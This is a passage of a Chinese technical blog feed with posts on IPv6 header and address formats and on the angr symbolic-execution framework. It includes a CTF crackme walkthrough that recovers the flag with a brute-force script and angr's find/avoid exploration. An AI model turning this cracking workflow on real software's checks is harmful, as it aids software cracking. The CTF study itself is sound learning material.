    <content type="text"><![CDATA[IPv6(Internet Protocol Version 6) 前言在上一次的学习中对IPv6的地址结构、类型等相关知识进行了学习整理，但那不是IPv6的基础的全部(好吧，是我忘记整理了)，这里就把IPv6的数据包构成细节进行整理。 IPv6首部格式emmm，这个已经在上一次记录中简单提及，真的是很简单啊，这里就略微详细的进行记录一下。 每一个IPv6分组中都一定有一个IPv6首部，并且是定长的。长为40字节，包含有传送分组所需的最小字段数。如下图所示就是IPv6首部结构。 版本：4bit，包含表示IPv6的值6 流量级别：8bit，端节点借助这个字段生成不同类别及优先级的流量。那些不同分组的流量类别决定了中间节点的分组转发。源节点默认该字段为0，在通往目的节点过程可能被修改。 流标签：20bit，用以区分不同流量类型流的方法。 净荷长度：16bit，表示跟在IPv6首部后面的IPv6分组长度，包含扩展首部和高层协议净荷长度。 下一首部：8bit，表示跟在IPv6首部后面的协议或扩展首部。 跳数限制：8bit，传输到目的节点过程中分组可以被路由转发的次数。每次转发字段减1，置零后丢弃分组。 源地址：128bit，装载了分组源节点的Iv6地址 目的地址：128bit，装载了分组目的节点的IPv6地址。 IPv6扩展首部扩展首部是IPv6由IPv4的选项概念扩展而来的，每个扩展首部都实现了一些可选的特性。它的工作方式类似于高层协议，除非被要求处理，否则拓展首部不一定被处理执行。因此，带有端到端选项特性的IPv6转发的重量级更轻一些。而且，扩展首部可能比IPv4选项字段的最大长度大出许多，这样也为未来诞出的其他选项提供了空间。 拓展首部的内容如下： 逐跳选项首部（Hop-by-Hop options header）8字节倍数 路由首部（Routing header）8字节倍数 片首部（Fragment header）8字节倍数 目的选项首部(Destination options header)8字节倍数 IPsec的两个附加拓展首部：鉴别首部AH(Authentication header) 封装安全净荷首部ESP（Encapsulating Security Payload header）。4字节倍数 扩展首部的位置在IPv6首部和高层协议首部之间，对于扩展首部的处理顺序取决于源端在分组中的首部顺序设置。一般来说，高层协议会终止扩展首部。如果高层协议不存在于分组，那么就会用一个虚构首部(即无下一个首部)来表示首部链结束。 如下所示是拓展首部的定义信息： 名字 前一个首部中的下一个首部字段值 Hop-by-Hop options 0 Destination options 60 Routing 43 Fragment 44 AH 51 ESP 50 No Next 59 对于一个分组中扩展首部的顺序和出现的次数建议如下所示，并不一定遵循该顺序，发送节点应该遵循，但接受节点不应该假定输入分组的扩展首部是按照该顺序，逐跳选项首部除外，他必须跟在IPv6首部后面，且不能出现多次。 另外目的首部可以看到出现了两次，前者由路由首部列出的所有中间节点处理，后者由最终的分组目的节点处理。移动IPv6会在路由首部和片首部之间指定一个目的首部。 顺序 扩展首部 1 IPv6首部 2 Hop-by-Hop 3 Destination 4 Routing 5 Fragment 6 Ipsec(AH or ESP) 7 Destination 8 高层首部 Hop-by-Hop逐条选项首部是由每个中间节点(例如通向目的地分组传输路径的中间路由器)检查并处理的，源节点和目的节点也对逐条选项首部进行处理。 下一跳首部：8bit，标识紧跟在目的选项首部之后的协议首部。 扩展首部长度：8bit，以8字节为单位的首部长度（不包含第一个8字节)。 选项：该字段是变长的，但必须保证逐跳选项首部是8字节倍数。 Destination 下一首部：8bit，标识紧跟在目的选项首部之后的协议首部。 扩展首部长度：8bit，以8字节为单位的首部长度（不包含第一个8字节)。 选项：8bit，以8字节为单位的首部长度（不包含第一个8字节)。 Routing执行源端路由选择的源节点用路由首部列出分组上所要经过的中间节点。 下一个首部：8bit，标识紧跟在目的选项首部之后的协议首部。 扩展首部长度：8bit，以8字节为单位的首部长度（不包含第一个8字节)。 路由类型：8bit，表示了路由首部的类型编号，IPv6拥有多类路由首部，[RFC2460]定义了类型0路由首部。 剩余段数：8bit，说明了到达目的节点过程中剩余的中间节点数 类型特有数据：该字段包含路由类型字段中指定的类型值特有的数据。 对于不认识的路由首部类型，若剩余段数字段为零，接受节点就会忽略它，并从该不认识路由首部之后的那个首部开始，继续对分组进行处理。另一方面，如果剩余字段值非零，那么节点就会丢弃分组，并生成一条错误报文(参数问题)。 FragmentIPv4中的分片机制已然证明了网络层的分组分片是有害的，分片增加了网络带宽，以及执行分片操作的路由器和执行重装功能的目的节点的处理开销。同时一个原始分组中部分片的丢失会极大降低整体的性能。 IPv6中未防止此类问题，不再鼓励进行分组分片，并且提出一个机制来找出相互通信节点间的最小链路MTU(最大传输单元)，以便在源节点上确定正确的分组长度。这种机制被称为PMTU(路径MTU发现)。 但是在形如发送打的UDP或ICMPv6分组的特别情况下，还是下需要进行分片和重装，在IPv6中，只有分组源端可以进行分片，而不是如同IPv4那也在路由器中对分组分片，IPv6中路由器会向分组源端发送错误报文(分组过长)来通知进行分片。 下一个首部：8bit，标识紧跟在目的选项首部之后的协议首部 Reserve：8bit，发送方保留字段置零，接收方忽略。 片偏移量：13bit，表示紧跟在片首部之后的数据相对于原始分组中可分片部分的起始处的偏移量(8字节为单位) Res：2bit，发送方保留字段置零，接收方忽略。 M：1bit，bool类型，表示后面是否还存在分片，置1则表示多个分片，置零则表示当前为最后一个分片。 标识：32bit，用于使接收方识别出属于同一个分组的片，分组源端会为每个需要分片的分组生成一个不同的标识值，此值比IPv4中的标识字段大，降低了标识冲突可能性。 下面的连个图分别描述了分片和重组的过程： 分片： 重组： IPv6选项Hop-by-Hop和Destination首部中都装载了数量可变的选项值，如下所示是值的编码格式： 选项类型：8bit，表示选项的类型。 选项数据长度：8bit，说明了以字节为单位的选项数据长度 选项数据：变长，装载了选项特有的数据]]></content>
      <categories>
        <category>protocol</category>
      </categories>
      <tags>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IPv6基础探析-I]]></title>
    <url>%2F2018%2F10%2F10%2FIPv6%E5%9F%BA%E7%A1%80%E6%8E%A2%E6%9E%90-I%2F</url>
    <content type="text"><![CDATA[IPv6(Internet Protocol Version 6) 前言IPv6全称是Internet Protocol Version 6，互联网协议，是IETF(Internet Engineering Task Force)设计用以替换现行IPv4的下一代IP协议。 IPv6的报头：版本信息，流量等级，流标签，净荷长度，下一报头，跳数限制 IPv6引入的最知名也是最重要的增强就是由IPv6地址比特数的增加带来的地址空间扩展，也就是从IPv4的32位增加到了128位。IPv4之所以设置为32位是因为当前的互联网上的主机CPU字长为32位。从处理效率以及未来网络扩展性角度考虑，128位是一个不错的选择。伴随着IPv6地址体系结构还引入了集中引入注目的特性，这些特性主要是基于IPv4的操作经验： IPv6有明确的地址范围概念 IPv6地址的结构性强 Ipv6中多播得到广泛的应用 这些在后面都会想学习涉及。 IPv6首部格式在上面已经简单说明了报头的6个组成这里稍微详细的说一下：所有的IPv6分组中都包含一个被称为IPv6首部的定长首部。IPv6首部长40字节，包含了传送分组所必需的最小字段数。 版本：4比特的版本字段，包含了表示IPv6的值6 流量类别：8比特的流量类别。短节点通过这个字段生成各种类别和优先级的流量，中间节点根据每个分组的流量类别来转发分组。默认情况下，源节点会将流量类别字段设置为零；但不管开始是否设置为零，在通往目的节点的途中，这个字段都可能会被修改。 流标签：20比特的流标签提供了一种区分不同流量类型的方法。为处理这个字段的节点设置了一些准则：由分组的源节点用一个非零的流标签来表示一个独立的“流”，比如一个特定的应用程序数据流。如果源节点没有将开始流量与流联系起来，就必须将这个字段置零。在通往目的节点的途中，不能对流标签字段进行修改。 净荷长度：一个16比特的无符号整数，说明了跟在IPv6首部后面的IPv6分组的长度，即包含扩展部首长度和高度协议净荷长度在内的长度。 下一部首：这个8比特字段中包含的数字用来标识紧跟在IPv6首部后面的协议或扩展部首。 跳数限制：这个8比特字段说明了在传向目的节点的过程中，指定分组可以被路由器转发的次数，每转发一次值减一，置零后丢弃分组。 源地址：这个128比特字段装载了该分组源节点的IPv6地址 目的地址：这个128比特装载了分组目的节点的IPv6地址。(如果提供了路由选择首部，目的节点可以是一个中间节点，否则目的节点始终就是最终的分组目的地。) IPv6地址IPv6地址是一个128bit的无符号整数，用来标识一个或多个网络接口。IPv6地址有3种类型： 单播：一个单播IPv6地址表示一个网络接口。目标为一个单播地址的分组会被传送到一个网络接口上去。 任播：任播IPv6地址标识一组网络接口。但目标为一个任播地址的分组只会被送到那个组中的一个接口中去。根据路由选择协议，接收分组的接口是离源最近的接口。 多播：IPv6多播地址标识一组网络接口。这些接口可能属于不同的节点。目标为多播地址的分组会被传送给那个组中所有的成员。 注：在IPv6下不存在广播地址，网络层的广播地址通常会造成链路级的广播，这回影响到附属链路中的所有设备，甚至包括哪些根本不支持特定协议的设备，在IPv6下，网络层的“广播”是通过多播来实现的。 IPv6地址的文本表达 IPv6是128bit，以十六进制表示：2001:0DB8:0123:4567:89AB:CDEF:0123:4567 IPv6的表示并不拘泥于大小写，上述等价于：2001:0db8:0123:4567:89ab:cdef:0123:4567 IPv6的八个字段至少有一个十六进制数字。字段中不需要写出前导的0，但会出现连续的0字段：2001:db8:123:1:0:0:0:1 当出现连续的0字段时采取缩写格式，压缩为::,但是一个IPv6中至多只能出现一次::。所以上一个IPv6地址表示为：2001:db8:123:1::1 IPv6网络前缀的文本表示为IPv6地址/前缀长度，其中前缀长度为一个十进制值，用以表示前缀的前导比特长度。表示上述地址和前缀长度64的形式如下：2001:db8:123:1::1/64 IPv6地址中前缀长度后面的部分无关紧要，可以将上一个地址表示为：2001:db8:123:1::/64 IPv6不允许不连续的掩码来表示一个网络。因此，用一个数字来指定前导有效比特就足够了，在IPv6地址结构中不存在掩码的概念。 IPv的单播地址有两个特殊例子： 环回地址：0:0:0:0:0:0:0:1或::1，很多系统中都存在特殊伪接口称为环回接口，环回地址就是分配给这个环回接口的地址。发送到环回地址的分组不回离开这个节点，也不会传送到物理网络中区。相反，分组会被作为输入分组重定向到传输节点自身中去。 不确定地址：0:0:0:0:0:0:0:0或::,不确定地址是一个标记值，用来说明一个接口地址的缺失。不能将不确定地址设置为任何一个分组的目的地址。路由器也不会转发以不确定地址作为源或目的地址的分组。 在从IPv4向IPv6的转换过程中，为了使得两个结点可以在一个混合网络环境中共存。定义了一些特殊的IPv6地址。这种特殊的IPv6地址是以IPv4地址作为IPv6地址的低32位比特来构建的，其余的96比特用一个预分配的IPv6前缀进行填充:0:0:0:0:0:ffff:192.0.2.1或::ffff:192.0.2.1。这样一来，某种类型的转换地址会将0:0:0:0:0:ffff::/96附加到IPv4地址前面。这种地址被称为IPv4映射IPv6地址。IPv4映射的IPv6地址以IPv6的地址形式表示了一个IPv4节点。IPv4映射的IPv6地址最引人注目的应用就是一个允许在IPv6套接字上进行IPv4通信的套接字API扩展。 另一种转换地址：0:0:0:0:0:0:192.0.2.2或压缩形式::192.0.2.2,这样在IPv4底之前附加96个0bit(::/96)。这类地址被称为IPv4兼容的IPv6地址。 地址范围地址范围的概念是IPv6地址设计中一个显著的特征。地址范围规定了地址“有效的范围”，就是可以将其作为一个接口或一组接口的唯一标识符使用范围。 对于单播地址来说，定义了三种类型的范围： 链路本地：fe80::/10。只在分配地址的接口所附接的网络链路上有效。要求每个支持IPv6的接口都至少要一个链路本地地址。 站点本地：fec0::/10。只在分配地址的接口所属的站点概念范围内有效，与链路不同的是站点的范围不是由网络的物理特性决定的。站点边界只能通过人工配置决定。 全局范围：所有其他单播地址的地址范围都被定义为全局的。在整个因特网范围内都有效。 对于多播地址来说，有四个比特的“范围”字段，用来标识地址范围： 0：保留1：接口本地2：链路本地3：保留4：管理本地5：站点本地6：未分配7：未分配8：组织本地9：未分配A:未分配B:未分配C:未分配D:未分配E:全局F:保留 接口本地多播范围局限于接口，并且用于接口所属的节点内部多播分组的环回传输1.接口本地多播地址的典型应用是进行一对多的进程间通信。通信中，一个进程可以将分组多播到同一节点的其他进程中去。 链路本地、站点本地和全局多播地址与相应范围的单播地址具有相同的寓意。 管理本地范围定义了包含非自动管理配置的最小范围。 组织本地范围涵盖了属于同一个组织的多个站点。 未分配范围是未定义的，管理员可以用来定义其他拓扑形式的多播区域。 所有大于链路本地且小于全局范围都是逻辑范围，其特定的拓扑范围由管理员决定 注：环回地址(::1)归为1一个特殊的链路本地地址，而不确定地址（::）没有任何范围。 对站点和组织进行解释，一个公司网络中，整个公司就是一个组织，公司中的单个网络就是一个独立的站点。 IPv6地址格式 单播地址结构 子网前缀部分标识一条特定的网络链路。子网前缀中通常会有层次结构。 接口标识符标识子网前缀确定的那条链路上的一个特定接口。单纯从体系结构的角度来看，类似于IPv4地址中主机标识符。它是一个可以在一条链路上唯一确定一个特定接口的标识符。但是，在某些网络类型中，通过自动地址配置机制，IPv6地址的接口标识符通常都与节点的物理接口有关。 有一种特殊的称为子网路由器任播地址的预定义地址与这个格式有关，发送这个地址的分组会被传送到由子网标识的链路上的一台路由器中去。接受路由器是根据某种标准，例如路由选择协议，判断出最近的一台路由器。所有路由器都要支持子网路由器的任播地址。 另外，除了以二进制比特000开头的地址之外，所有单播地址的接口标识符长度都是64比特。 链路本地：fe80::/10 站点本地：fec0::/10 全局路由前缀标识一个站点或组织，而子网ID则表示了该站点或组织内的一个特定子网。 接口标识符的产生 由IEEE EUI-64规范生成，标识符有24比特的组织唯一标识符（c）和40比特的扩展标识符（m）组成，在组织标识符中，图中的u标识这64比特的标识符是全局管理还是本地管理(如果是本地的，就要将这个比特置位)。g标识这个标识符是单个硬件实例还是一组硬件实例. 上图是IEEE MAC-48地址转换为64比特的标识符。转换方法是将前面的本地标识0转换为全局标识1，然后在MAC-48地址中插入0xFFFE,将其扩展到64比特。即00-60-97-8F-6A-4E转换为了02-60-97-FF-FE-8F-6A-4E。 注:在标准的IEEE扩展中。插入的16bit应当使用0xFFFF。 多播地址格式 上图表示的是多播地址格式，具体分解如下： 多播地址以ff开头。所以前8个比特为11111111 下面四个bit是标志位: 最高标志位保留，必须为0. T:0：表示永久的多播组地址，由IANA(Internet Assigned Number Authority)分配。1：表示动态分配的多播组地址。 P:说明多播地址是否基于某个网络前缀分配。当P为1时，多播地址就是基于网络前缀分配，此时T也必须为1，说明这是动态分配的多播地址。这样就确保了在每个域的基础上都很容易定义唯一的多播地址。 R:进一步拓展了基于网络前缀的多播地址。如果R为1，说明多播地址中嵌套了网络所用多播路由选择协议的汇聚点 地址。此时P与T都要为1，所以此类多播地址公用前缀为FF70::/12标识。 下面4个比特右移表示作用范围，这个取值对应的范围意义已经在前面列出。 最后32比特的组ID被划分为了3个区间： 0x00000001~0x3FFFFFFF:永久IPv6多播地址的组ID 0x40000000~0x7FFFFFFF:永久组ID 0x80000000~0xFFFFFFFF:动态IPv6多播地址的组ID，此时标志T必须为1 注:永久多播地址的组ID或永久组ID都是独立于多播地址的整体范围的。例如将ff0X::101永久分配给NTP服务器组。那么: ff02:0:0:0:0:0:0:101 ：标识了一条特定链路上的所有NTP服务器 ff05:0:0:0:0:0:0:101 ：标识了一条特定站点上的所有NTP服务器 ff08:0:0:0:0:0:0:101 ：标识了一条特定组织上的所有NTP服务器 在IPv6地址体系结构中还定义了一些特殊的多播地址： 所有节点多播地址为：ff01:0:0:0:0:0:0:1、ff02:0:0:0:0:0:0:1 所有路由器多播地址：ff01:0:0:0:0:0:0:2、ff02:0:0:0:0:0:0:2、ff05:0:0:0:0:0:0:2 请求节点多播地址：前缀为ff02:0:0:0:0:1:ff00::/104。然后获取单播或任播地址的低24bit，并附加在请求节点多播地址前缀后面而构建的。一个单播地址2001:db8:7654:3210:fedc:ba98:7654:3210的请求节点多播地址为ff02:0:0:0:0:1:ff54：3210]]></content>
      <categories>
        <category>protocol</category>
      </categories>
      <tags>
        <tag>IPv6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Angr应用]]></title>
    <url>%2F2018%2F10%2F09%2FAngr%E5%BA%94%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Angr符号执行 前言之前已经把Angr下的所有方法进行了学习了解，但停留于表面等于没学，需要结合相关的题目进行应用才可以正确掌握。Angr在github的源码中以及提供有一个example的文件夹，里面包含了许多难易不一的比赛题目以及基于Angr的解题脚本。链接在这里。 参考：Angr状态选项列表：https://docs.angr.io/appendix/options 正文这里以一道简单的题目作为例子进行学习：ais3_crackme,在linux下查看可以看到这个程序是一个64位程序 我们可以直接把程序脱到64位IDA下进行分析： 第一眼看来很简单，只要if中的条件能够达成就可以了，那么重点就在verify。 程序自带的数据：就是程序自带的数据与指令行的输入进行处理后的结果进行比较，满足条件即可。 如果没有angr我们可以选择爆破，构造对应条件爆破对位字符即可。脚本如下： import string key=[ 0xCA, 0x70, 0x93, 0xC8, 0x06, 0x54, 0xD2, 0xD5, 0xDA, 0x6A, 0xD1, 0x59, 0xDE, 0x45, 0xF9, 0xB5, 0xA6, 0x87, 0x19, 0xA5, 0x56, 0x6E, 0x63] flag=&quot;&quot; for i in range(len(key)): for a1 in string.printable: if (((((((ord(a1))&amp;0xff) ^ i) &lt;&lt; ((i ^ 9) &amp; 3))&amp;0xff) | ((((( ord(a1))&amp;0xff) ^ i) &gt;&gt; ((8 - ((i ^ 9) &amp; 3))&amp;0xff))&amp;0xff))+ 8)&amp;0xff==key[i]: flag+=a1 print flag 这里可以选择Angr进行解题。想要使用Angr，基本的操作就是先要将程序进行加载： project = angr.Project(&quot;./ais3_crackme&quot;) 上面已经提到，这里是通过命令行获取参数args，所以我们需要claripy库构造一个符号状态，从IDA中不难看出flag的长度为23，所以设置如下： u = claripy.BVS(&quot;u&quot;,23*8) 此时我们需要获取程序的入口状态，并代入参数： state = project.factory.entry_state(args=[&quot;./ais3_crackme&quot;,u]) 下面要做的就是构造一个模拟器将程序载入进行等候运行，以找寻正确答案： sm = project.factory.simulation_manager(state) 下面就是运行程序，但是这里我们可以进行一些小小的设置，这个题目的尽头有两种可能，成功提示，错误提示，或者就是没有思路。emmm，那么在尝试的过程中会触碰到多条路径，探索的过程中的限制我们先不讨论，我们可以设置尽头，我们只想要能够通向成功的路径。 所以我们可以在运行的时候加入如下限制，find后面跟的就是正确结果，avoid就是错误结果: sm.explore(find=0x400602,avoid=0x40060E) 下面使用eval将找到值进行转换得到结果就是flag了(cast_to就是转换的类型，目前只能指出int和str两种)： solution = found.solver.eval(argv1, cast_to=str) 最终跑出结果： 脚本在题目所在目录下已经包含，这里就不贴了。 小结Angr通俗而言就是爆破，但是在其中包含有许多其他的技术，约束求解、解析程序等。上述题目解答逻辑较为清晰，所以可以自主编写爆破脚本进行解答。但是有的题目设置了比较复杂的算法在其中，这时候编写解题脚本的过程就较为复杂,且不考虑出错的情况。所以Angr可以帮助更快的得到结果。大致的解题过程： 对题目进行分析找到正确路径地址，运行中的检验条件，flag长度等一系列信息。 加载程序，设置参数(根据分析得到的flag长度进行设置，也可设置一个大致数值，关乎效率)，获得入口状态(根据需求，添加参数，添加状态选项等) 根据IDA下分析添加约束条件，提高效率。 使用模拟器进行符号执行求解。 获得运算结果。]]></content>
      <categories>
        <category>binary</category>
      </categories>
      <tags>
        <tag>Angr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Angr学习记录]]></title>
    <url>%2F2018%2F09%2F29%2FAngr%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[Angr符号执行 参考：http://www.freebuf.com/sectool/143056.htmlhttps://github.com/a7vinx/angr-doc-zh_CN/ Angr简介Angr的含义Angr是一个二进制代码分析工具，能够自动化完成二进制文件的分析,执行动态的符号执行(如Mayhem,KIEE等)。众所周知的是，在二进制代码中寻找并且利用漏洞是一项非常具有挑战性的工作，它的挑战性主要在于人工很难直观的看出二进制代码中的数据结构、控制流信息等。Angr的出现便使得这个问题变得易于解决。Angr是一个基于python的二进制漏洞分析框架,对二进制文件分析，并找到漏洞。使得漏洞挖掘的效率进一步得到提高。基于符号执行的fuzz工具driller就结合了Angr和AFL。 Angr的执行 将二进制程序利用CLE装载入Angr的分析系统中 将二进制程序转换为中间语言(Intermediate representation,IR) 将IR转换为语义较强的表达形式，形如这个程序做了什么，并非它是什么。 执行进一步的分析，比如，完整的或者部分静态分析(依赖关系分析，程序块分析)、程序空间的符号执行探索(挖掘漏洞)、一些对于上面方式的结合 Angr的安装Angr是Python下的一个库，目前只在python2下受到支持，相信python3以后也会支持。所以利用python的方法就可以进行安装了，但是关键在于Angr的依赖需要解决： sudo apt-get install python-dev libffi-dev build-essential virtualenvwrapper 依赖结束后执行如下指令即可完成安装： mkvirtualenv angr &amp;&amp; pip install angr Angr学习嗯，幻想一个场景，一场ctf比赛，我门是选手，点开赛题，一道reverse题提供了一个二进制附件名为r100,ok,开始做题。 Angr之装载模块创建对象Project意为项目，这里angr的而金子装载组件是CLE，负责将二进制对象及其依赖的库以及易于对其进行操作的方式交给angr的其他组件。Project就是加载二进制文件的方法。就像做pwn题时候我们使用ELF加载题目一样，道理都是一样的。 import angr p = angr.Project(&apos;./r100&apos;) 信息查询使用上述方法之后就已经把r100这个二进制文件进行了加载。这时候我们便可以得到很多关于这个二进制文件的信息了。 p.entry //二进制文件的入口点 p.loader.min_addr()/p.loader.max_addr() //二进制文件内存空间中的最小地址和最大地址 p.filename //二进制文件的名称，即r100 程序交互loader方法代表了已经装载了的和映射到内存空间中的CLE二进制对象。每一种二进制对象都是由一种可以处理这种文件类型的后端装载器装载，比如ELF就是用以装载ELF文件。 CLE的交互指令如下： p.loader //一个CLE装载器对象 p.loader.shared_objects //这是一个字典，包含已经作为二进制文件的一部分而装载的对象(种类取决于后端装载器) p.loader.memory[b.loader.min_addr()] //这是装载后的进程的内存空间，它包含具体的地址与对应的值 p.loader.addr_belongs_to_object(b.loader.max_addr()) //返回映射在指定地址的二进制对象。 p.loader.find_symbol_got_entry(‘__libc_start_main’) //获取二进制文件的got表地址 与独立的二进制对象交互： p.loader.main_bin.deps //这里获取程序依赖的库名列表，通过读取ELF文件的dynamic section的DT_NEEDED域获取。 注：dynamic sections下的NEEDED元素保存了以NULL结尾的字符串表的偏移量，这些字符串都是所依赖库的名字。 p.loader.main_bin.memory //这是关于主二进制对象的内存内容的dict p.loader.shared_objects[‘libc.so.6’].imports //这是一个装载的libc所需的导入条目的dict(name–&gt;ELFRelocation) p.loader.main_bin.imports 这一个是主二进制对象所需的导入条目的dict(name–&gt;ELFRelocation),地址通常为0. 装载选项CLE工作时会默认地尝试装载二进制文件所需的依赖（比如libc.so.6等），除非装载选项中进行设置auto_load_libs为False。当装载库文件的时候，如果无法找到，装载器会默认忽略产生的错误并且标记所有关于那个库的依赖为已解决的状态。 装载选项传递是以dict形式进行传递。传递给Project后会转传给CLE。如上所示，如果我们想要设置选项为不装载依赖库，则可以使用如下指令： p=angr.Project(&apos;./r100&apos;,load_options={&quot;auto_load_libs&quot;:Flase}) 除此以外，其他的装载选项列举如下： load_options[‘force_load_libs’] = [‘libleet.so’] //无论是否是目标二进制文件所需要的，强制装载的库的list load_options[‘skip_libs’] = [‘libc.so.6’] //需要跳过的库的list load_options[‘main_opts’] = {‘backend’: ‘elf’} //装载主二进制文件时的选项 load_options[‘lib_opts’] = {‘libc.so.6’: {‘custom_base_addr’: 0x13370000}} //映射库名到其装载时需要使用的选项dict的dict load_options[‘custom_ld_path’] = [‘/etc/libs’] //可以进行额外搜索的路径list load_options[‘ignore_import_version_numbers’] = False //是否将文件名中版本号不同的库视作相同的，比如libc.so.6和libc.so.0 load_options[‘rebase_granularity’] = 0x1000 //在重定位共享对象的基址的时候需要使用的对齐值 load_options[‘except_missing_libs’] = True //如果找不到一个库，抛出一个异常（默认行为是忽略未找到的库） 下面两个选项被应用于每一个对象并且覆盖CLE的自动检测。它们可以通过main_opts或者lib_opts来应用。 load_options[‘main_opts’]={‘custom_base_addr’:0x4000} //装载二进制文件的基址为0x4000 load_options[‘main_opts’]={‘backend’:’elf’} //指定对象的后端装载器(这里指定为elf) 上面两者可同时设置，如下所示： load_options[‘main_opts’]={‘backend’:’elf’,’custom_base_addr’:0x40000} 后端装载器选项CLE集成了ELF,PE，CGC及ELF核心转储文件的后端支持，像IDA一样可以将文件装载。在CLE运作时，会自动检测需要使用的后端，当然如果已经知晓文件的结构信息，也可进行手动指定。关键字backend指定后端，custom_arch关键字指定架构。 load_options[‘main_opts’] = {‘backend’:’elf’,’custom_arch’:’i386’} load_options[‘lib_opts’] = {‘libc.so.6’:{‘backend’：’elf’}} 后端关键字 描述 是否需要custom_arch elf 基于PyELFTools的ELF装载器 no pe 基于PEFile的PE装载器 no cgc Cyber Grand Challenge文件的装载器 no backedcgc 支持指定内存和寄存器支持CGC文件装载器 no elfcore ELF核心转储文件的装载器 no ida 启动IDA来解析文件 yes blob 装载文件到内存中作为一个平坦的镜像 yes Angr之求解模块Angr的魅力不在于它是一个模拟器，而是符号执行功能。当它拥有一个符号而并非一个变量或是一个定值。对这个符号进行一系列的算术运算，所有运算整合成为一个操作树,称之为抽象语法树（AST）。同时AST可在后面转换为SMT求解器的约束。比如说python下的另一个库z3，已知操作序列的输出，求输入的值。 继续假设r100程序所需的输入是来自指令行，我们装载r100之后，就可以就这个值进行构造。开头三部曲： import angr, monkeyhex proj = angr.Project(&apos;./r100&apos;) state = proj.factory.entry_state() BVVBitvertor是一个位序列，用算术的有界整数进行语义解释，它的缩写就是BV了。 BVV的作用则是定义一个指定的value，如下所示指定64位的1与100以及27位的9： one = state.solver.BVV(1,64) //output of one:&lt;BV64 0x1&gt; hundred = state.solver.BVV(100,64) //output of hundred:&lt;BV64 0x64&gt; new_nine = state.solver.BVV(9,27) //output of new_nine:&lt;BV27 0x9&gt; 既然这里指定的是value，又是有界的整数，那么相同位的值自然是可以进行算法操作的： one + hundred ：&lt;BV64 0x65&gt; hundred + 0x21: &lt;BV64 0x85&gt; hundere - one*200 :&lt;BV64 0xFFFFFFFFFFFFFF9C&gt; 不同位的值如果想要进行操作，则必须将低位数的值进行拓展到与高位值一致才可,有两种方法： zero_extend:使用给定的数量的零在左侧填充位向量。 sign_extend:与上者相反，填充高位。 这里想要把27位的值与64位的值进行操作的话，则需要将27位拓展填充到64位： new_nine.zero_extend(64-27) //output:&lt;BV64 0x9&gt; one + new_nine.zero_extend(64-27) //output:&lt;BV64 0xA&gt; BVSBVS的作用则是定义一个符号symbol，如下所示指定64位下的符号x与y: x=state.solver.BVS(&quot;x&quot;,64) //output:&lt;BV64 x_0_64&gt; y=state.solver.BVS(&quot;y&quot;,64) //output:&lt;BV64 y_1_64&gt; 这里可以看到输出的x,y符号都被命名了，我们可以看出来，X_X_X,第一个表示符号名称，第二个是符号排序位置，第三个则是符号的位数。 不论是x还是y现在都是符号性的变量了，但是依旧是可以进行算数运算的，得到的不是一个数字，而是一个AST。 x + one //&lt;BV64 x_0_64 + 0x1&gt; (x + one) / 2 //&lt;BV64 (x_0_64 + 0x1) / 0x2&gt; x - y //&lt;BV64 x_1_64 - y_1_64&gt; AST这里的x,y,one。只要是bitvector都是一个AST，即使操作只有1层。那么AST如何处理？ 每一个AST都有一个.op和.args。通俗的来说，op就是指出两个符号或值在做些什么，输出是一个字符串。args则是执行操作时候的输入。 tree = (x + 1) / (y + 2) //output of tree:&lt;BV64 (x_0_64 + 0x1) / (y_1_64 + 0x2)&gt; tree.op //&apos;__div__&apos; tree.args //(&lt;BV64 x_0_64 + 0x1&gt;, &lt;BV64 y_1_64 + 0x2&gt;) tree.args[0].op //&apos;__add__&apos; tree.args[0].args //(&lt;BV64 x_0_64&gt;, &lt;BV64 0x1&gt;) tree.args[0].args[1].op //&apos;BVV&apos; tree.args[0].args[1].args //(1, 64) 符号约束如果将两个类型相似的AST进行比较操作依然会产生一个AST而非bitvector，而是符号布尔类型值。 x == 1 //&lt;Bool x_0_64 == 0x1&gt; x == one //&lt;Bool x_0_64 == 0x1&gt; x &gt; 2 //&lt;Bool x_0_64 &gt; 0x2&gt; x + y == hundred + 5 //&lt;Bool (x_0_64 + y_1_64) == 0x69&gt; hundred &gt; 5 //&lt;Bool True&gt; hundred &gt; -5 //&lt;Bool False&gt; 上述有一个奇怪的地方，hundred值是正整数，与-5相比应该是True，可为什么返回的是False呢？因为默认情况下的是无符号类型的比较，那么-5就被强制转换为了,自然大于100. 那么在if 或者是while语句中则不能直接使用变量之间的比较，可能无法得到具体的真值。这里可以这样使用。 yes = one == 1 //必然事件no = one == 2 //不可能事件maybe = x == y //可能事件state.solver.is_true(yes) //Turestate.solver.is_false(yes) //Falsestate.solver.is_true(no) //Falsestate.solver.is_false(no) //Truestate.solver.is_true(maybe) //Falsestate.solver.is_false(maybe) //False 添加约束当我们对r100进行分析之后，我们也许可以判断出所要得到的值的一些信息，比如长度，字符的Ascii大小等。那么为了增加效率，减少错误尝试。便可以认为添加约束。举个例子： state.solver.add(x &gt; y) //约束x&gt;y state.solver.add(y &gt; 2) //约束y&gt;2 state.solver.add(10 &gt; x) //约束x&lt;10 state.solver.eval(x) //求x满足条件的最小值为4 如果像Z3那样已知算法和输出结果求解输入值，就可写成如下格式： state = proj.factory.entry_state() //创建对象得到入口点 input = state.solver.BVS(‘input’, 64) //定义一个符号 operation = (((input + 4) * 3) &gt;&gt; 1) + input //操作 output = 200 //定义输出值 state.solver.add(operation == output) //添加约束，操作后值等于输出值 state.solver.eval(input) //求解input 此解决方案只适用于比特向量，而非整数域。有的时候在使用时也会不小心添加有矛盾或者不合逻辑的约束，可以使用如下命令进行检测，以防报错： state.satisfiable() //True/False 浮点数FPV及FPS与BVV/BVS类似，可以使用FPV（float point valuse）及FPS(float point symbols)创建。 a = state.solver.FPV(3.2, state.solver.fp.FSORT_DOUBLE) //&lt;FP64 FPV(3.2, DOUBLE)&gt; b = state.solver.FPS(&apos;b&apos;, state.solver.fp.FSORT_DOUBLE) //&lt;FP64 FPS(&apos;FP_b_0_64&apos;, DOUBLE)&gt; a + b //&lt;FP64 fpAdd(&apos;RNE&apos;, FPV(3.2, DOUBLE), FPS(&apos;FP_b_0_64&apos;, DOUBLE))&gt; a + 4.4 //&lt;FP64 FPV(7.6000000000000005, DOUBLE)&gt; b + 2 &lt; 0 //&lt;Bool 